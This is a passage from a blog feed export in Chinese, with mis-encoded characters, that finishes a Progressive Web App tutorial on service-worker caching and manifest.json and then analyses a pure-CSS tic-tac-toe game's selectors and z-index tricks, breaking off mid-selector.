cache first then networkï¼šä¸€æ¬¡ç™¼å…©ç¨® requestï¼Œå…ˆæŠ“ cache è³‡æ–™ï¼Œç­‰ network request å›ä¾†å¾Œæ›´æ–° cacheã€‚
network first then cacheï¼šå…ˆç™¼ network requestï¼Œè‹¥ timeout å†æ’ˆ cache è³‡æ–™ã€‚

é€™é‚Šæˆ‘å€‘æ¡ç”¨ cache-firstï¼Œæ‰èƒ½å› æ‡‰å¿«é€Ÿ response èˆ‡ offline ä½¿ç”¨çš„éœ€æ±‚ã€‚
é¦–å…ˆæˆ‘å€‘å¾—åœ¨ service-worker ä¸­åŠ å…¥ä¸€å€‹ dataCacheNameï¼Œç”¨ä»¥å€åˆ†è³‡æ–™èˆ‡ app shell çš„ cacheã€‚
service-worker.jsvar dataCacheName = &#x27;weatherData-v1&#x27;;

æ¥è‘—åœ¨ fetch event handler ä¸­ï¼Œæˆ‘å€‘å°‡æŠ“å–è³‡æ–™çš„API request èˆ‡å…¶ä»– request åˆ†é–‹ã€‚
service-worker.jsself.addEventListener(&#x27;fetch&#x27;, function(e) &#123;    console.log(&#x27;[ServiceWorker] Fetch&#x27;, e.request.url);    var dataUrl = &#x27;https://publicdata-weather.firebaseio.com/&#x27;;    if (e.request.url.indexOf(dataUrl) === 0) &#123;      // Put data handler code here    &#125; else &#123;      e.respondWith(        caches.match(e.request).then(function(response) &#123;          return response || fetch(e.request);        &#125;)      );    &#125;  &#125;);
ä¸Šé¢çš„ code ä¸­ï¼Œservice-worker æœƒæ“·å–é é¢ç™¼å‡ºçš„ requestï¼Œå¦‚æœåŒ…å« dataUrlï¼Œæˆ‘å€‘å°±å¦å¤–è™•ç†ï¼š
e.respondWith(    fetch(e.request)      .then(function(response) &#123;        return caches.open(dataCacheName).then(function(cache) &#123;          cache.put(e.request.url, response.clone());          console.log(&#x27;[ServiceWorker] Fetched&amp;Cached Data&#x27;);          return response;        &#125;);      &#125;)  );

åˆ©ç”¨ fetch API ç™¼é€ requestï¼Œé€å›ä¾†çš„ response å†å‚³å›å»ä¹‹å‰ï¼Œæœƒå…ˆ clone ä¸€ä»½åˆ° cache ç•¶ä¸­ã€‚
åˆ°é€™é‚Šç‚ºæ­¢æˆ‘å€‘ cache ä½è³‡æ–™äº†ï¼Œä½†é‚„æ˜¯ä¸èƒ½ offline é‹ä½œï¼å› ç‚ºé‚„å°‘äº†ä¸€å€‹æ­¥é©Ÿï¼Œå…ˆå‰æåˆ°æˆ‘å€‘è¦åŒæ­¥ç™¼é€ å…©å€‹ requestï¼Œä¸€å€‹æŠ“ cacheï¼Œä¸€å€‹çœŸçš„é€è³‡æ–™ã€‚
åœ¨ app.js ä¸­çš„ app.getForecastè£¡åŠ å…¥é€™æ®µï¼š
app.jsif (&#x27;caches&#x27; in window) &#123;  caches.match(url).then(function(response) &#123;    if (response) &#123;      response.json().then(function(json) &#123;        // Only update if the XHR is still pending, otherwise the XHR        // has already returned and provided the latest data.        if (app.hasRequestPending) &#123;          console.log(&#x27;[App] Forecast Updated From Cache&#x27;);          json.key = key;          json.label = label;          app.updateForecastCard(json);        &#125;      &#125;);    &#125;  &#125;);&#125;

å…ˆæª¢æŸ¥ window æœ‰ç„¡æ”¯æ´ caches objectï¼Œæ¥è‘—å¾ caches ä¸­æ‹¿å‡ºè³‡æ–™ï¼Œé€™æ™‚è¦ç¢ºèªä¸€ä¸‹åŒæ™‚ç™¼é€å‡ºå»çš„ network request æ˜¯å¦å·²ç¶“ response å›ä¾†äº†ï¼Œæˆ‘å€‘é€™é‚Šç”¨å€‹ flag app.hasRequestPending ä¾†æ§åˆ¶ã€‚åªæœ‰åœ¨ network response é‚„æ²’å›ä¾†å‰æˆ‘å€‘æœƒä½¿ç”¨ caches å…§çš„è³‡æ–™ã€‚
è€Œåœ¨ç™¼é€åŸæœ¬çš„ XMLHttpRequest ä¹‹å‰ï¼Œè¨˜å¾—åŠ ä¸Š app.hasRequestPending = true;ï¼Œä¸¦åœ¨ app.updateForecastCard(response)ä¹‹å‰ï¼Œå°‡ app.hasRequestPending è¨­ç‚º falseã€‚
Test Offline functionåˆ°ç›®å‰ç‚ºæ­¢æˆ‘å€‘çš„ Web app å·²ç¶“å¯ä»¥åœ¨ offline ä½¿ç”¨äº†ï¼Œå³ä¾¿é ç«¯ host æ›æ‰ï¼Œæˆ‘å€‘èƒ½å¾ cache ä¸­æŠ“åˆ°æˆ‘å€‘çš„ App Shellï¼Œä¸¦ä¸”é€é service worker å¹«æˆ‘å€‘å»è·Ÿ https://publicdata-weather.firebaseio.com/ è¦è³‡æ–™ï¼›è‹¥æ˜¯é€£ç¶²è·¯éƒ½æ²’æœ‰ï¼Œè‡³å°‘æœƒæœ‰ cache çš„è³‡æ–™å¯ä»¥é¡¯ç¤ºï¼


Support Native IntegrationProgressive Web App çš„æœ€å¾Œä¸€å“©è·¯ï¼Œæˆ‘å€‘è¦åŠ å…¥ Add-to-Homescreenã€‚
è¦æœ‰ Add to Homescreen çš„åŠŸèƒ½ä¸é›£ï¼Œåªè¦åŠ å…¥ä¸€å€‹ manifest.json å³å¯ï¼Œé€éé€™æ–¹å¼æ‰“é–‹çš„ Web App ä¸æœƒé¡¯ç¤ºå‡º URL barï¼Œçœ‹èµ·ä¾†å°±åƒä¸€èˆ¬çš„ Appï¼ä½ ä¹Ÿå¯ä»¥å†åŠ å…¥ Web app install bannersï¼Œé€™é‚Šå°±ä¸è¨è«–ï¼Œå¯ä»¥çœ‹é€™ç¯‡çš„æ•™å­¸ - Web app install banners
Web App Manifesté€é web app manifestï¼Œä½ å¯ä»¥ï¼š

åƒ App ä¸€èˆ¬æœ‰å€‹æ¼‚äº® icon é¡¯ç¾åœ¨ Android çš„ Homescreen ä¸Šã€‚

é–‹å•Ÿæ™‚å¯ä»¥é€²å…¥å…¨è¢å¹•ç•«é¢ï¼Œä¸é¡¯ç¤º URL barï¼

æ§åˆ¶ screen orientationã€‚

è¨­å®š splash screenï¼Œä»¥å‰æ˜¯ç‚ºäº†é™ä½ User ç­‰å¾…è¼‰å…¥æ™‚é–“ï¼Œä½†ç¾åœ¨é€šå¸¸éƒ½ç”¨ä¾†å®£å‚³ä½ çš„ç¶²ç«™å“ç‰Œç­‰ç­‰ï¼ˆæœ‰äº›äººæ˜¯ä¸æ¨è–¦ä½¿ç”¨â€¦ï¼‰

è¿½è¹¤ä½ çš„ App æ˜¯å¾ homescreen é‚„æ˜¯ url é–‹å•Ÿã€‚


manifets.json&#123;  &quot;name&quot;: &quot;Weather&quot;,  &quot;short_name&quot;: &quot;Weather&quot;,  &quot;icons&quot;: [&#123;    &quot;src&quot;: &quot;images/icons/icon-128x128.png&quot;,      &quot;sizes&quot;: &quot;128x128&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/icons/icon-144x144.png&quot;,      &quot;sizes&quot;: &quot;144x144&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/icons/icon-152x152.png&quot;,      &quot;sizes&quot;: &quot;152x152&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/touch/icon-192x192.png&quot;,      &quot;sizes&quot;: &quot;192x192&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/touch/icon-256x256.png&quot;,      &quot;sizes&quot;: &quot;256x256&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;],  &quot;start_url&quot;: &quot;/&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;background_color&quot;: &quot;#3E4EB8&quot;,  &quot;theme_color&quot;: &quot;#2F3BA2&quot;&#125;
[å°æŠ€å·§] å¯ä»¥é€éåœ¨ start_url è¨­ç½® query string çš„åƒæ•¸ä¾†è¿½è¹¤é–‹å•Ÿä¾†æºã€‚
manifest æª”æ¡ˆè¨­å®šå¥½å¾Œè¨˜å¾—å›åˆ°ä½ çš„ index.html çš„ &lt;head&gt; åŠ ä¸Š &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;
for safari in ioså¦‚æœè¦ç”¨åœ¨ ios ä¸Šçš„ safari é‚„éœ€è¦é¡å¤–è¨­å®š
&lt;!-- Add to home screen for Safari on iOS --&gt;&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;Weather App&quot;&gt;&lt;link rel=&quot;apple-touch-icon&quot; href=&quot;images/icons/icon-152x152.png&quot;&gt;

Best practices
åœ¨ä½ ç¶²ç«™çš„æ¯å€‹ page éƒ½å¯æ”¾å…¥ manifest.jsonï¼Œé€™æ¨£ä¸ç®¡ user æ˜¯å¾å“ªé é€²å»ï¼ŒChromeéƒ½èƒ½åµæ¸¬åˆ°
short_name ç›¡é‡éƒ½è¦è¨­ç½®ï¼Œå„ªå…ˆæ¬Šé«˜æ–¼ name é€™å€‹ fieldã€‚
icon çš„å¤§å°è¦ç›¡å¯èƒ½ç¬¦åˆå¤šç¨® deviceã€‚
icon ä¹Ÿè¦è€ƒé‡åˆ°æ˜¯å¦ç¬¦åˆ slash screenï¼Œä¸¦è¨˜å¾—è¨­ç½® background_color

Finalæœ€çµ‚åˆ°ä½ æ‰‹æ©Ÿä¸Šçš„å‘ˆç¾å°±æœƒåƒé€™æ¨£ï¼š
IOS ç‰ˆæœ¬ (ISO ç‰ˆæœ¬çœ‹ä¸åˆ° splash screenï¼Œä¸ç¢ºå®šåŸå› ï¼Œå¯èƒ½ç‰ˆæœ¬ä¸æ”¯æ´ï¼‰ï¼š


Android ç‰ˆæœ¬ï¼ˆä¸»è¦æ˜¯çœ‹å¾—åˆ° splash screen..ï¼‰ï¼š


çµè«–çœ‹äº†ä»Šå¹´ Google I&#x2F;O èˆ‡ Apple WWDC å¾Œï¼ŒApple æ„Ÿè¦ºæƒ³æŠŠ App æ›´èå…¥ä»–å€‘çš„ç³»çµ±ï¼Œä»¥å¾Œæˆ–è¨±ä¸æœƒå†æœ‰ App çš„æ¦‚å¿µï¼Œå°±æ˜¯ Appleã€‚è€Œ Google å‰‡æŒçºŒæ¨å»£ Progressive Web Appï¼Œå¸Œæœ›è®“ Web èƒ½å¤ æ›´è¡Œå‹•åŒ–ï¼Œä¼¼ä¹éƒ½å¸Œæœ›èƒ½å¤ å¼­å¹³ä¸€äº›éš”é–¡ã€‚
æˆ‘å€‹äººæ˜¯è »å¸Œæœ› Progressive Web App çš„æ–¹å¼èƒ½æ™®åŠï¼Œå¯æƒœç¾åœ¨çš„ç€è¦½å™¨æ”¯æ´åº¦é‚„å¾ˆå·®ï¼Œéœ€è¦æ›´å¤šæ™‚é–“ï¼Œä½†å¤§å®¶æ‡‰è©²æœ‰çœ‹éé€™å¼µåœ–ï¼š


App å¾ä¸‹è¼‰åˆ°å®‰è£ä½¿ç”¨çš„äººæ•¸å·®äº†å››åˆ†ä¹‹ä¸€ï¼Œå¦‚æœ Progressive Web App å¯ä»¥èµ·ä¾†çš„è©±ï¼Œç›¸ä¿¡å°ä½¿ç”¨è€…èˆ‡é–‹ç™¼è€…ä¾†èªªéƒ½æ˜¯é›™è´çš„å±€é¢ï¼ˆæ›´å¤šäººä½¿ç”¨ã€åˆä¸æœƒä½”æ‰‹æ©Ÿç©ºé–“ã€åˆä¸ç”¨åˆ° app store æ›´æ–°ï¼‰ï¼Œä½†å¤§å» æ€éº¼æƒ³å°±ä¸çŸ¥é“äº†â€¦
ä½†è‡³å°‘ Progressive web app æœƒå¸¶çµ¦ä½¿ç”¨è€…æ›´å¥½çš„ web ç€è¦½é«”é©—æ˜¯ç„¡åº¸ç½®ç–‘çš„ï¼

è³‡æ–™ä¾†æº
Google developer web fundamentals
html5rocks: service-worker
Google developer web app install banner

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>pwa</tag>
        <tag>web app</tag>
      </tags>
  </entry>
  <entry>
    <title>è§£æï¼šç´” CSS çš„åœˆåœˆå‰å‰</title>
    <url>/2019/05/25/pure-css-tic-tac-toe-analyze/</url>
    <content><![CDATA[å‰è¨€åœ¨å¾ˆä¹…ä¹‹å‰å¯«éä¸€ç¯‡ä½¿ç”¨ CSS ç¹ªåœ–çš„æ–‡ç« ï¼Œä½† CSS èƒ½åšçš„ä¸åƒ…æ­¢æ–¼æ­¤ï¼Œåˆ©ç”¨ Pure CSS è£½ä½œéŠæˆ²çš„å¤§æœ‰äººåœ¨ï¼Œåƒæ˜¯ Pure CSS Games collection è£¡é¢ç¾…åˆ—çš„ã€‚
ä¸éä½ çŸ¥æˆ‘çŸ¥ä½ éš”å£æˆ´çœ¼é¡çš„ä¹ŸçŸ¥ï¼Œç´” CSS è£½ä½œçš„åœ–ç•«æˆ–æ˜¯éŠæˆ²ï¼Œå¯¦ä½œæˆæœ¬é«˜ã€é–±è®€æ€§ä¸ä½³ï¼Œä¹Ÿé›£ä»¥èª¿æ•™æ•ˆèƒ½ï¼Œå¹¾ä¹ç„¡æ³•æ‡‰ç”¨åˆ°å¯¦éš›ç”¢å“ä¸Šã€‚
å¯æ˜¯å¾ˆå¥½ç©å•Šï¼åˆ©ç”¨æœ‰é™æ¢ä»¶åŠ ä¸Šå„ç¨®æŠ€å·§æƒ³è¾¦æ³•å®Œæˆé æƒ³ä¸­çš„æ•ˆæœï¼Œæˆå°±æ„Ÿæ˜¯å¾ˆå¤§çš„ï¼Œèƒ½å¤ æœ‰èƒ½åŠ›è·Ÿæ™‚é–“è£½ä½œå‡ºé€™æ¨£çš„ä½œå“ï¼Œæˆ‘è¦ºå¾—æ˜¯å¾ˆå¥¢ä¾ˆçš„å¹¸ç¦ã€‚
è€å¯¦èªªæˆ‘é‚„æ²’æœ‰é‚£å€‹èƒ½åŠ›åšåˆ°å¦‚æ­¤åœ°æ­¥ï¼Œä½†å¾è§€å¯Ÿä»–äººçš„ä½œå“å°±èƒ½å­¸ç¿’åˆ°å¾ˆå¤šæœ‰è¶£çš„æŠ€å·§ï¼
ä»Šå¤©å°±ä¾†åˆ†æä¸€ä¸‹åœ¨ codepen ä¸Šçœ‹åˆ°çš„é€™å€‹ç´” CSS åœˆåœˆå‰å‰æ˜¯æ€éº¼å¯¦åšå‡ºä¾†çš„ï¼š

  See the Pen 
  CSS Tic-Tac-Toe by Alvaro Montoro (@alvaromontoro)
  on CodePen.



è§€å¯Ÿä¸€ä¸‹åŠŸèƒ½
é€™å€‹ä½œå“çš„å®Œæˆåº¦å¾ˆé«˜ï¼Œå¯¦ä½œå‡ºä¾†çš„æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š

é»é¸æ–¹æ ¼å¾Œï¼Œèƒ½å¤ ç•™ä¸‹ä¸åŒ style çš„ X æˆ–æ˜¯ Oã€‚
æ»‘é¼  hover åˆ°æ–¹æ ¼ä¸Šæ™‚ï¼Œä¹Ÿé‚„èƒ½è¼ªæµå‡ºç¾åœˆåœˆå‰å‰ï¼Œè®“ä½ çŸ¥é“ç¾åœ¨æ˜¯è¼ªåˆ°å“ªå€‹ç©å®¶ã€‚
éŠæˆ²çµæŸæ™‚ï¼Œèƒ½å¤ è·³å‡ºé¸é …é‡æ–°ç©ã€‚

å°æ–¼ CSS ç¨å¾®æ•éŠ³ä¸€äº›ï¼Œæˆ–æ˜¯æœ‰çœ‹éé¡ä¼¼ä½œå“çš„å¯¦ä½œæ–¹å¼çš„è®€è€…ï¼Œæ‡‰è©²è »å¿«å¯ä»¥çŒœåˆ°ç¬¬ä¸€é»èƒ½å¤ éä»€éº¼æ¨£çš„æŠ€å·§é”æˆã€‚ä½†ä½œè€…æ˜¯å¦‚ä½•è®“åœˆåœˆèˆ‡å‰å‰äº¤æ›¿å‡ºç¾ï¼Œæˆ‘å€’æ˜¯ç„¡æ³•å¾ˆå¿«æƒ³å‡ºä¾†ã€‚
å¦‚æœä½ ä¹Ÿè·Ÿæˆ‘ä¸€æ¨£ï¼Œåˆ¥æ€•ï¼
æ¥ä¸‹ä¾†æˆ‘å€‘å¾åŠŸèƒ½é¢ä¾†ä¸€æ­¥æ­¥æ‹†è§£ä»–æ‰€ä½¿ç”¨åˆ°çš„æŠ€å·§ï¼Œå¤§å®¶å¯ä»¥å°ç…§åŸä½œè€…ç¨‹å¼ç¢¼çœ‹ï¼Œæœƒæ›´å¥½ç†è§£ã€‚
ä¾é ç´” CSS å¦‚ä½•åœ¨ä½¿ç”¨è€…é»æ“Šå…ƒç´ å¾Œï¼Œé€²è€Œè®Šæ›´å…ƒç´ ç‹€æ…‹å‘¢ï¼Ÿé€é input[type=radio] èˆ‡ :check åƒé¡åˆ¥çš„çµåˆï¼Œæˆ‘å€‘å°±èƒ½è£½é€ å‡ºé»æ“Šèˆ‡éé»æ“Šçš„å…©ç¨®ç‹€æ…‹ï¼š
/* ... çœç•¥ ... */input[id*=&#x27;-8-x&#x27;]:checked ~ #board #tile-8 div::before &#123;  content: &quot;X&quot;;  background: #004974;  color: #89dcf6;&#125;/* ... çœç•¥ ... */input[id*=&#x27;-8-o&#x27;]:checked ~ #board #tile-8 div::before &#123;  content: &quot;O&quot;;  background: #a60011;  color: #ffc7b5;&#125;

å¾åŸä½œç¨‹å¼ç¢¼ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è¨±å¤šé¡ä¼¼ pattern çš„ selectorï¼Œå…¶ä¸­ä¸Šé¢é€™å…©ç¨®å°±æ˜¯åœ¨è™•ç† X ç©å®¶èˆ‡ O ç©å®¶å„è‡ªé»æ“Šäº† board ä¸Šçš„ä¸€å€‹ç©ºæ ¼å¾Œï¼Œè©²é€²è¡Œçš„ CSS æ¨£å¼æ”¹è®Šã€‚
input[id*=&#39;-8-x&#39;]ï¼Œä»£è¡¨çš„æ˜¯ **é¸å–æ‰€æœ‰ id attribute ä¸­ã€åŒ…å«ã€å­—ä¸² â€˜-8-xâ€™ çš„ input å…ƒç´  **ã€‚æ¥è‘—åŠ ä¸Š :check å°±èƒ½ filter å‡ºè¢«ä½¿ç”¨è€…é¸å–çš„ input å…ƒç´ ã€‚
è€Œå¾Œé¢çš„ ~ #board #tile-8 div::before å‰‡æ˜¯è¡¨ç¤ºï¼Œåœ¨ç¬¦åˆä¸Šé¢æ¢ä»¶çš„ input å…ƒç´ ä¸‹çš„æ‰€æœ‰ç¬¦åˆ #board #tile-8 div çš„ div å…§ï¼Œæˆ‘å€‘åŠ ä¸Šä¸€å€‹ ::before åƒå…ƒç´ ï¼Œä¸¦ä¸”è¨­å®šå…¶ css ç‚º content: &quot;X&quot;ã€‚
é€™æ¨£çš„ä¸€æ®µ CSS selector è¢«è§¸ç™¼å¾Œï¼Œå°±å¯ä»¥é”åˆ°é»æ“Šå¾Œç•™ä¸‹ X æ¨™è¨˜çš„æ•ˆæœäº†ï¼š

å¾ä¸­å¯ä»¥æ˜é¡¯çœ‹å‡ºï¼Œä½œè€…æ˜¯åˆ©ç”¨ -o èˆ‡ -x é€™å…©ç¨® postfix ç•¶ä½œ X ç©å®¶èˆ‡ O ç©å®¶çš„æ›²åˆ¥ï¼Œä»Šå¤©è‹¥æ˜¯ id attribute ä¸­å«æœ‰ -0 çš„ input å…ƒç´ è¢«é»é¸ï¼Œå°±æ˜¯ O ç©å®¶é»æ“Šç©ºæ ¼ï¼Œå¾—æ”¾å…¥ Oã€‚
æ­¤å¤–ï¼Œç”±æ–¼ input[type=radio] å…ƒç´ ï¼Œåœ¨ç€è¦½å™¨ä¸­çš„å›ºå®šæ¨£å¼å°±æ˜¯ä¸€å€‹åœ“å½¢é¸æ“‡éˆ•ï¼Œè¦æ›¿æ›æˆäº•å­—ç©ºæ ¼ï¼Œä¸¦ä¸”åˆèƒ½è§¸ç™¼é»æ“Šçš„æ–¹å¼ï¼Œå°±æ˜¯çµåˆ form èˆ‡ label å…ƒç´ ï¼Œç¶å®šå°æ‡‰çš„ input æŒ‰éˆ•ï¼š
&lt;form id=&quot;tictactoe&quot;&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-0&quot; id=&quot;cell-0-x&quot; /&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-0&quot; id=&quot;cell-0-o&quot; /&gt;  &lt;!-- ... çœç•¥ ... --&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-8&quot; id=&quot;cell-8-x&quot; /&gt;  &lt;input type=&quot;radio&quot; name=&quot;cell-8&quot; id=&quot;cell-8-o&quot; /&gt;  &lt;div id=&quot;board&quot; class=&quot;center&quot;&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-0&quot;&gt;      &lt;label for=&quot;cell-0-x&quot;&gt;&lt;/label&gt;      &lt;label for=&quot;cell-0-o&quot;&gt;&lt;/label&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;!-- ... çœç•¥ ... --&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-8&quot;&gt;      &lt;label for=&quot;cell-8-x&quot;&gt;&lt;/label&gt;      &lt;label for=&quot;cell-8-o&quot;&gt;&lt;/label&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;  &lt;!-- ... çœç•¥ ... --&gt;&lt;/form&gt;

å¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘å¯ä»¥æŠŠ input æŒ‰éˆ•è—åˆ°ç•«é¢çœ‹ä¸åˆ°çš„åœ°æ–¹ï¼Œç„¶å¾Œè¼•æ˜“å¥—ç”¨ä»»ä½• style åˆ° label ä¸Šé ­ï¼Œåšå‡ºäº•å­—ç©ºæ ¼ã€‚
input[type=&quot;radio&quot;] &#123;  position: absolute;  top: -9999em; /* è—åˆ°ç•«é¢å¤– */&#125;

Hover å‡ºå¾Œå‡ºç¾é¡å¤–å…ƒç´ å¾ˆå¸¸è¦‹ï¼Œä½†æ€éº¼è®“ä»–äº¤æ›¿å‡ºç¾ä¸åŒå…ƒç´ ï¼Ÿå¥½ï¼ŒçŸ¥é“æ€éº¼é€é input[type=radio] ä¾†æ›´æ”¹ç©ºæ ¼ç‹€æ…‹ä¹‹å¾Œï¼Œæˆ‘å€‘ä¾†ç ”ç©¶ä½œè€…æ˜¯å¦‚ä½•é€é Hover å¾Œçš„ä¸åŒæ¨£å¼ï¼Œå‘ˆç¾å‡º X ç©å®¶èˆ‡ O ç©å®¶è¼ªæµçš„æ„Ÿè¦ºå‘¢ï¼Ÿ
è¦åœ¨æ¸¸æ¨™ hover æ™‚å‡ºç¾å…ƒç´ ï¼Œå°±æ˜¯çµåˆåƒé¡åˆ¥èˆ‡åƒå…ƒç´ ä¾†åœ¨ Hover åˆ°çš„ç©ºæ ¼ä¸ŠåŠ å…¥ X æˆ– Oã€‚ï¼š
.tile label[for$=&#x27;-o&#x27;]:hover::before &#123;  content: &quot;O&quot;;&#125;.tile label[for$=&#x27;-x&#x27;]:hover::before &#123;  content: &quot;X&quot;;&#125;

åˆ°é€™é‚Šç‚ºæ­¢éƒ½ä¸ç¨€å¥‡ï¼Œä¸éé‚„ç„¡æ³•ç†è§£ç‚ºä½•å¯ä»¥äº¤æ›¿å‡ºç¾ã€‚
è§£ç­”åœ¨åŸå§‹ç¢¼ä¸­é€™æ®µçœ‹èµ·ä¾†å¾ˆå¯æ€•çš„ cssï¼š
label[for$=&#x27;-x&#x27;] &#123;  z-index: 1;&#125;input:checked ~ #board label[for$=&#x27;-o&#x27;] &#123;  z-index: 2;&#125;input:checked ~ input:checked ~ #board label[for$=&#x27;-x&#x27;] &#123;  z-index: 3;&#125;input:checked ~ input:checked ~ input:checked ~ #board label[for$=&#x27;-o&#x27;] &#123;  z-index: 4;&#125;/* ... çœç•¥ä¸€æ®µ z-index 5 ~ 8 ... */input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ #board label[for$=&#x27;-x&#x27;] &#123;  z-index: 9;

å‰é¢æˆ‘å€‘æœ‰æåˆ°ï¼Œä½œè€…æ˜¯åˆ©ç”¨ label ä¾†åšå‡ºäº•å­—ç©ºæ ¼ä»¥åŠ hover å¾Œå‘ˆç¾çš„ X èˆ‡ O ç¬¦è™Ÿï¼Œè€Œåœ¨ html ä¸­å¯ä»¥çœ‹åˆ°æ¯å€‹ç©ºæ ¼åº•ä¸‹éƒ½æœ‰é€™æ¨£çš„çµæ§‹ï¼š
&lt;div class=&quot;tile&quot; id=&quot;tile-0&quot;&gt;  &lt;label for=&quot;cell-0-x&quot;&gt;&lt;/label&gt;  &lt;label for=&quot;cell-0-o&quot;&gt;&lt;/label&gt;  &lt;div&gt;&lt;/div&gt;&lt;/div&gt;

æ­é…ä¸Šæ–¹çš„ CSSï¼Œæˆ‘å€‘å°±èƒ½çŸ¥é“ä½œè€…æ˜¯é€éæ›´æ”¹ label çš„ z-index ä¾†äº¤æ›¿åœ°è§¸ç™¼ .tile label[for$=&#39;-o&#39;]:hover::before èˆ‡ .tile label[for$=&#39;-x&#39;]:hover::beforeï¼Œé€²è€Œé”åˆ°æƒ³è¦çš„æ•ˆæœã€‚
è‡³æ–¼æ§åˆ¶çš„æ–¹å¼å°±æ˜¯é€é :check ç‚º true çš„ input æ•¸é‡ï¼š
ç•¶æ²’æœ‰ä»»ä½•ä¸€å€‹ radio input è¢« check æ™‚ï¼Œè¨­å®šæ‰€æœ‰ for attribute çµå°¾ç‚º -x çš„ label çš„ z-index ç‚º 1ï¼Œå°±æœƒè®“æ¸¸æ¨™ hover åˆ°ç©ºæ ¼æ™‚ï¼Œæœƒæ˜¯ &lt;label for=&quot;cell-0-x&quot;&gt;&lt;/label&gt; çš„ hover è¢«è§¸ç™¼ï¼Œè€Œä¸æ˜¯ &lt;label for=&quot;cell-0-o&quot;&gt;&lt;/label&gt;ã€‚
è‹¥æœ‰ä¸€å€‹ radio input è¢«é¸æ“‡å¾Œï¼Œä»£è¡¨è¦æ›æˆ O ç©å®¶ï¼Œinput:checked ~ #board label[for$=&#39;-o&#39;] å°±è¢«è§¸ç™¼äº†ï¼Œæ‰€æœ‰ for attribute çµå°¾ç‚º -o çš„ label çš„ z-index è®Šç‚º 2ï¼Œå¤§æ–¼å‰›å‰›çš„ x labelï¼Œé€™æ™‚ä½¿ç”¨è€…åœ¨ hover åˆ°ä»»ä½•ä¸€å€‹ç©ºæ ¼æ™‚ï¼Œå‡ºç¾çš„å°±é€šé€šéƒ½æœƒæ˜¯ O äº†ï¼
é›–ç„¶é€™æ¨£çš„åšæ³•è®“ CSS è »å†—é•·çš„ï¼Œä½†é‚„æ˜¯ä¸å¾—ä¸è®šå˜†ä½œè€…èƒ½æƒ³å‡ºåˆ©ç”¨ z-index ä¾†è£½é€ å‡ºé€™æ¨£çš„æ•ˆæœï¼ŒçœŸçš„å¾ˆå²å®³å•Šâ€¦é–±è®€æ€§ä¹Ÿç®—å¾ˆé«˜çš„ã€‚
åˆ¤æ–·è¼¸è´ä»¥åŠé‡æ–°éŠç©çš„åŠŸèƒ½æ€éº¼å¯¦ä½œï¼Ÿåœ¨éŠæˆ²çµæŸçš„æ™‚å€™ï¼Œä¸ç®¡æ˜¯å“ªç¨®çµæœï¼Œç•«é¢ä¸Šéƒ½æœƒç–Šä¸Šä¸€å±¤è¨Šæ¯èˆ‡é‡æ–°éŠç©çš„æŒ‰éˆ•ï¼Œé€™éƒ¨åˆ†çš„ html è—åœ¨æœ€ä¸‹æ–¹å«æœ‰ end class name çš„ div å…§ï¼š
&lt;div id=&quot;end&quot;&gt;  &lt;div id=&quot;message&quot; class=&quot;center&quot;&gt;    &lt;div&gt;      &lt;input type=&quot;reset&quot; for=&quot;tictactoe&quot; value=&quot;Play again&quot; /&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;

ç”±æ–¼æ•´å€‹éŠæˆ²éƒ½æ˜¯åŒ…å«åœ¨ä¸€å€‹ form ä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€é type ç‚º reset çš„ input æŒ‰éˆ•ä¾†é‡è¨­æ‰€æœ‰çš„ radio button ç‹€æ…‹ï¼Œé”åˆ°é‡æ–°éŠç©çš„åŠŸèƒ½ã€‚
è€Œé¡¯ç¤ºè¨Šæ¯æ¡†ä»¥åŠåˆ¤æ–·è¼¸è´çš„æ–¹æ³•å…¶å¯¦è »æš´åŠ›çš„ï¼Œå°±æ˜¯ä¸€ä¸€æª¢æŸ¥å„ç¨®çµ„åˆï¼Œæ©«çš„ã€ç›´çš„èˆ‡æ–œçš„ï¼š
#cell-0-x:checked ~ #cell-1-x:checked ~ #cell-2-x:checked ~ #end #message::before,#cell-3-x:checked ~ #cell-4-x:checked ~ #cell-5-x:checked ~ #end #message::before,#cell-6-x:checked ~ #cell-7-x:checked ~ #cell-8-x:checked ~ #end #message::before,#cell-0-x:checked ~ #cell-3-x:checked ~ #cell-6-x:checked ~ #end #message::before,#cell-1-x:checked ~ #cell-4-x:checked ~ #cell-7-x:checked ~ #end #message::before,#cell-2-x:checked ~ #cell-5-x:checked ~ #cell-8-x:checked ~ #end #message::before,#cell-0-x:checked ~ #cell-4-x:checked ~ #cell-8-x:checked ~ #end #message::before,#cell-2-x:checked ~ #cell-4-x:checked ~ #cell-6-x:checked ~ #end #message::before &#123;  content: &quot;Player 1 won!&quot;;&#125;#cell-0-o:checked ~ #cell-1-o:checked ~ #cell-2-o:checked ~ #end #message::before,#cell-3-o:checked ~ #cell-4-o:checked ~ #cell-5-o:checked ~ #end 